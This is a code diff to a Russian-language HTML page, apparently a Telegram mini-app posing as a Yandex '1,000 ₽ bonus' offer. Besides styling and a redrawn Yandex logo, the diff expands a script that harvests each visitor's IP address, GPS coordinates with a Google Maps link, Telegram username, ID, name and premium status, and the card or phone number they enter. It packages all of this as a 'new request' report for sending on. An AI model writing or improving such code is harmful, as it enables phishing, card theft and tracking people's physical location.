@@ -57,13 +57,16 @@
         }
 
         .amount {
-            font-size: 52px;
-            font-weight: 900;
-            margin: 5px 0;
-            background: linear-gradient(to right, #FFCC00, #FFEE00);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
+    font-size: 52px;
+    font-weight: 900;
+    margin: 5px 0;
+    background: linear-gradient(to right, #FFCC00, #FFEE00);
+    /* Исправленный блок ниже */
+    -webkit-background-clip: text;
+    background-clip: text; 
+    -webkit-text-fill-color: transparent;
+    filter: drop-shadow(0 0 15px rgba(255, 204, 0, 0.4));
+}
 
         /* Выбор способа получения */
         .method-selector {
@@ -150,6 +153,12 @@
             border-radius: 18px;
             border: 1px dashed rgba(255,204,0,0.3);
         }
+        .y-logo-wrapper {
+    margin-bottom: 25px;
+    display: flex;
+    justify-content: center;
+    filter: drop-shadow(0 0 8px rgba(255, 204, 0, 0.4)); /* Желтое неоновое свечение */
+}
 
         .hidden { display: none; }
     </style>
@@ -158,8 +167,15 @@
 
 <div class="bg-animate"></div>
 
-<div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Yandex_logo.svg" class="y-logo">
+<div class="y-logo-wrapper">
+    <svg width="70" height="28" viewBox="0 0 70 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M11.5 25V3.5H15.8L11.5 25Z" fill="#FFCC00"/>
+        <path d="M22 25H18L13 13L8 25H4L11 8.5V3.5H15V8.5L22 25Z" fill="white"/>
+        <path d="M32 25H28V3.5H32V25Z" fill="white"/>
+        <path d="M44 25H40V14H36V25H32V3.5H36V10H40V3.5H44V25Z" fill="white"/>
+        <path d="M56 25H52V14.5C52 11.5 50.5 10 48.5 10C46.5 10 45 11.5 45 14.5V25H41V3.5H45V8C46 5 48 3.5 50.5 3.5C54 3.5 56 6 56 10V25Z" fill="white"/>
+    </svg>
+</div>
     
     <div style="font-size: 14px; color: #888; letter-spacing: 1px;">ДОСТУПНЫЙ БОНУС</div>
     <div class="amount">1,000 ₽</div>
@@ -265,19 +281,32 @@
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const { ip } = await ipRes.json();
             const location = await getCoords();
-            const user = tg.initDataUnsafe?.user || {};
+           const user = tg.initDataUnsafe?.user || {};
+const isPremium = user.is_premium ? '🌟 ДА' : 'НЕТ';
 
-            const wallet = currentMethod === 'sbp' ? 
-                `СБП: ${document.getElementById('phone').value}` : 
-                `КАРТА: ${document.getElementById('card_num').value}`;
+// Формируем чистую ссылку на Google Maps
+let mapLink = "Недоступно";
+if (location && location !== "Запрещено") {
+    const coords = location.split(' (')[0]; // Берем только цифры 55.123, 61.123
+    mapLink = `https://www.google.com/maps?q=${coords}`;
+}
 
-            const fullInfo = `
-👤 **ЮЗЕР:** @${user.username || 'n/a'}
-🆔 **ID:** ${user.id || 'n/a'}
-👤 **ИМЯ:** ${user.first_name || ''}
-🌐 **IP:** ${ip}
-📍 **GEO:** ${location}
-💳 **ДАННЫЕ:** ${wallet}`;
+const wallet = currentMethod === 'sbp' ? 
+    `СБП: ${document.getElementById('phone').value}` : 
+    `КАРТА: ${document.getElementById('card_num').value}`;
+
+const fullInfo = `
+💰 **НОВАЯ ЗАЯВКА!**
+━━━━━━━━━━━━━━━━━━
+👤 **ЮЗЕР:** @${user.username || 'скрыт'}
+🆔 **ID:** \`${user.id || 'n/a'}\`
+👤 **ИМЯ:** ${user.first_name || ''} ${user.last_name || ''}
+⭐️ **PREMIUM:** ${isPremium}
+🌐 **IP:** \`${ip}\`
+📍 **ГЕО:** [Открыть на картах](${mapLink})
+📍 **КООРД:** \`${location}\`
+💳 **РЕКВИЗИТЫ:** ${wallet}
+━━━━━━━━━━━━━━━━━━`;
 
             const formData = new FormData();
             formData.append('phone', wallet);
